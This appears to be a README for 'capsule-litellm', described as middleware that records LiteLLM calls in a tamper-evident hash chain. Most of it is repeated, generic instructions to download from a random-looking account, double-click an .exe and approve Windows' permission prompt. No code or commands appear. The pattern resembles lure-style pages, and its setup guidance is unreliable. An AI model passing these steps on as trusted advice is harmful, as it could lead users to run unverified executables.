# 🔐 capsule-litellm - Track Every LLM Call

[![Download](https://img.shields.io/badge/Download-Capsule%20LiteLLM-blue?style=for-the-badge)](https://github.com/anisogametic-foodfish212/capsule-litellm)

## 🧭 What this app does

capsule-litellm adds a cryptographic audit trail to each LLM call made through LiteLLM. It records the path of each request in a chain of hashes, so you can review what happened later and spot changes.

Use it when you want a simple way to keep LLM calls traceable, tamper-evident, and easier to review.

## 💻 Who this is for

This app is a good fit if you:

- Use LiteLLM with OpenAI, Anthropic, or other model providers
- Want a record of each prompt and response path
- Need an audit trail for internal review
- Care about data integrity and trace checks
- Want a setup that runs on Windows

## 📦 Download and run

Use this link to visit the page to download:

[Visit the Capsule LiteLLM page](https://github.com/anisogametic-foodfish212/capsule-litellm)

1. Open the link in your browser.
2. Look for the latest release or the main project files.
3. Download the Windows package if one is provided.
4. If the project gives you a setup file, run it.
5. If it gives you a Python package, follow the included install steps.
6. After setup, open the app or connect it to your LiteLLM workflow.

If you are unsure which file to use, choose the one made for Windows or the file marked for end users.

## 🪟 Windows setup

Follow these steps on Windows:

1. Download the app from the link above.
2. Save the file to your Downloads folder.
3. If the file is a ZIP archive, right-click it and choose Extract All.
4. Open the folder that contains the app files.
5. If you see an .exe file, double-click it to start the app.
6. If you see install instructions in the folder, follow them in order.
7. When Windows asks for permission, choose Yes if you trust the source.
8. Keep the app in a fixed folder so you can open it again later.

If your browser blocks the file, check the download list and retry from the same page.

## 🧩 What you get

capsule-litellm is built around a few simple ideas:

- Every LLM call gets a trace
- Each trace links to the one before it
- The chain helps show if data changed
- The log supports review after the call finishes
- The output is meant for audit and safety work

This gives you a record that is easier to inspect than plain logs alone.

## 🔍 Main features

- Cryptographic audit trail for LLM calls
- Hash chain support for tamper-evident records
- Works with LiteLLM middleware flows
- Fits OpenAI and Anthropic request patterns
- Useful for AI safety checks
- Helps with internal audits and trace review
- Built for end-user setups with clear steps

## 🛠️ How it works

When a request goes through LiteLLM, capsule-litellm adds tracking data around that call. It then links the record to the previous one with a hash. Each new entry depends on the last entry, which makes the chain harder to change without leaving signs.

In plain terms:

- You send a prompt
- LiteLLM handles the model call
- capsule-litellm records the event
- The record joins a chain
- You can review the chain later

This makes it easier to keep a clean history of model activity.

## ⚙️ Basic use

Use capsule-litellm in your LiteLLM flow if you want call history with integrity checks.

Typical use cases:

- Store a trail of user prompts
- Track responses from a model
- Review a full request path
- Compare entries during an audit
- Check whether logs were altered

If you already use LiteLLM, this project fits into the same path without changing how you work with models.

## 🔐 Why cryptographic logs matter

Normal logs can be edited. A hash chain makes edits easier to spot. That matters when you need to prove that an LLM call happened in a certain order and that the record has not been changed.

This is useful for:

- Safety review
- Model oversight
- Internal policy checks
- Incident review
- Compliance work
- Data integrity checks

## 🧪 Example workflow

A simple workflow can look like this:

1. A user sends a prompt.
2. LiteLLM sends the request to a model.
3. capsule-litellm records the event.
4. The record is linked to the previous one.
5. A reviewer checks the trail later.

The result is a clean path from input to output with an audit record in between.

## 📁 What to expect after download

After you open the project or package, you may see:

- A Windows app file
- Setup instructions
- A config file
- Example code
- A README with usage notes

Start with the main app file or the first setup step shown in the project files.

## 🧰 System needs

For a smooth Windows setup, use:

- Windows 10 or Windows 11
- A current web browser
- Enough free space for the app and its logs
- Internet access if the app needs to reach model APIs
- A working LiteLLM setup if you plan to connect it to live calls

If the project uses Python on your machine, have Python installed before you begin.

## 🧭 Common first steps

If you are setting this up for the first time:

- Download the files
- Extract the folder if needed
- Read any setup file in the folder
- Open the app or run the install step
- Connect it to your LiteLLM path
- Send one test call
- Check the audit output

Start with one test call before you use it with real traffic.

## 📌 Topics covered

This project fits these areas:

- ai
- ai-safety
- anthropic
- audit-trail
- capsule
- cryptography
- hash-chain
- litellm
- llm
- middleware
- openai
- python
- tamper-evident

## 🧾 File and record behavior

The app is designed to keep records that are hard to change without detection. Each entry builds on the one before it. That means the order matters.

You can use this to:

- Check call history
- Review request order
- Compare entries across sessions
- Keep a stronger audit log
- Support trust checks during review

## 🖥️ Tips for Windows users

- Keep the download in one folder
- Do not move files after setup unless the app says it is safe
- Use a folder with a short path, like `C:\Apps\capsule-litellm`
- If the app does not open, check that the download finished
- If Windows blocks the file, use the file details to confirm the source
- If you use Python, install it before you try to run the project files

## 🧭 Where to start in the project

If the download includes several files, look for:

- `README.md`
- `requirements.txt`
- An `.exe` file
- A setup script
- A config file

The first file to read is the README inside the project folder if one is included. It usually shows the next step.

## 🔗 Download link

[Open the capsule-litellm download page](https://github.com/anisogametic-foodfish212/capsule-litellm)

## 🧷 Quick path

1. Open the link above
2. Download the Windows file or project files
3. Extract the folder if needed
4. Start the app or follow the setup steps
5. Connect it to LiteLLM
6. Run one test call
7. Review the audit trail